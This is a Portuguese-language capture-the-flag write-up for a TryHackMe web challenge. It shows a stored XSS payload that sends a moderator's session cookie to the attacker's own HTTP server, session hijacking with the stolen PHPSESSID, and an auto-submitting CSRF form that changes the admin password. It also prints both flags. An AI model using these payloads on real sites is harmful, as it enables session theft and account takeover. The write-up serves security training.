# Whats Your Name?
###### Solved by @Mayaracar2
>This is a challenge about Web Exploitation, XSS and CSRF
## Desafio: Whats Your Name? (Exploração Web) 
### Introdução
O desafio “What’s Your Name?” apresenta um ambiente vulnerável projetado para testar habilidades de exploração no lado do cliente, envolvendo manipulação de JavaScript, cookies, e ataques XSS (Cross-Site Scripting) e CSRF (Cross-Site Request Forgery). A máquina disponibilizada pela TryHackMe contém as ferramentas necessárias para análise e exploração, enquanto o domínio `worldwap.thm` precisa ser configurado manualmente no arquivo `hosts`.

A proposta central é simples:

*“Nunca clique em links de fontes desconhecidas. Você consegue capturar as flags e obter acesso ao painel administrativo?”*

O objetivo final é capturar duas flags:

- Flag após acessar a conta de Moderador;
- Flag após obter acesso ao painel de Admin.

- [Página do desafio](https://tryhackme.com/room/whatsyourname)

### Análise inicial
Antes de iniciar a exploração, o domínio necessário para o funcionamento da aplicação foi adicionado ao arquivo `/etc/hosts`:

```bash
sudo nano /etc/hosts
# Adicione a linha: 10.65.169.52 worldwap.thm
```
<img width="662" height="440" alt="image" src="https://github.com/user-attachments/assets/c7946691-6381-4ab5-888a-0c50ec7ec368" />

Ao acessar o domínio, o usuário percebeu que o formulário de registro informava que as informações seriam revisadas por um moderator. Isso indicava imediatamente a possibilidade de um ataque de Stored XSS, caso o campo de nome não fosse devidamente sanitizado.

Tentativas de login também revelaram o subdomínio `login.worldwap.thm`, igualmente adicionado ao hosts.

<img width="933" height="376" alt="image" src="https://github.com/user-attachments/assets/3ceb357d-1896-4344-bd07-9bbb4c32ad57" />

## Solução
A solução divide-se em duas etapas: Roubo de Sessão (XSS) e Tomada de Conta (CSRF).

### 1. Explorando Stored XSS (Flag Moderador)
#### Identificação da Vulnerabilidade

O fluxo do site revela um ponto crítico: o Moderador revisa manualmente os registros enviados. Caso o campo “Name” aceite scripts, isso permite a execução arbitrária de JavaScript no navegador do moderador.

#### 1. Preparação para Captura do Cookie
Um servidor simples em Python foi iniciado para capturar requisições:

   ```bash
   python3 -m http.server 8000
   ```

#### 2. Injeção do Payload
No campo Name, foi injetado um payload XSS que exfiltra o cookie utilizando uma requisição de imagem:

```bash
<script>new Image().src='http://10-64-71-208:8000/?c='+document.cookie</script>
```
Assim que o Moderador acessou a página que lista os registros, o navegador dele executou o script, enviando o cookie de sessão para o atacante.

#### 3. Sequestro de Sessão (Session Hijacking)
Com o cookie `PHPSESSID` capturado, o atacante injetou-o manualmente no navegador:

```bash
document.cookie="PHPSESSID=VALOR_DO_COOKIE_CAPTURADO; path=/; domain=.worldwap.thm";
location.reload();
```
A página recarregou autenticada como Moderador, revelando a primeira flag:

```bash
`ModP@wnEd`
```

<img width="934" height="378" alt="image" src="https://github.com/user-attachments/assets/5d202fda-dee8-44de-b239-4d1506dff2be" />


### 2. Explorando CSRF (Flag Admin)
#### Identificação da Vulnerabilidade

Dentro do painel do moderador, havia um sistema de mensagens capaz de enviar links diretamente ao Administrador, que os acessava.
A página change_password.php apresentava uma falha grave: permitia alterar a senha sem exigir a senha antiga, tornando o endpoint vulnerável a CSRF.

#### 1. Criação do Exploit
Um arquivo exploit.html foi criado com um formulário invisível que altera a senha automaticamente:

```bash
<html>
  <body>
    <form action="http://login.worldwap.thm/change_password.php" method="POST">
      <input type="hidden" name="new_password" value="mayara123">
      <input type="submit" value="Mudar Senha">
    </form>
    
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
O arquivo foi hospedado no mesmo servidor Python.

#### 2. Envio do Link Malicioso ao Admin
No chat interno com o Admin, o link foi enviado:

```bash
http://10-64-71-208:8000/exploit.html
```
Como o Admin estava autenticado, ao clicar no link, sua senha foi alterada silenciosamente.

#### 3. Acesso ao Painel do Administrador
Com a nova senha:

- User: Admin
- Password: mayara123

o atacante acessou o painel, obtendo a segunda flag:

```bash
AdM!nP@wnEd
```

<img width="935" height="362" alt="image" src="https://github.com/user-attachments/assets/d6167f65-5a4f-46ea-89c0-0aea4dc17b9d" />

## Conclusão
O desafio demonstra com clareza o impacto combinado de duas vulnerabilidades clássicas, porém frequentemente negligenciadas: Stored XSS e CSRF.
A exploração mostrou que:

- A falta de sanitização em entradas do usuário permitiu a execução de código arbitrário no navegador do moderador, possibilitando o roubo de sessão.
- A ausência de validação na alteração de senha do Admin abriu espaço para um ataque CSRF efetivo, resultando na tomada completa do sistema.

Esse cenário reforça a importância de práticas fundamentais como sanitização adequada, uso de tokens CSRF, segregação de domínios, e políticas de segurança no lado do cliente, medidas essenciais para prevenir ataques simples, porém devastadores.
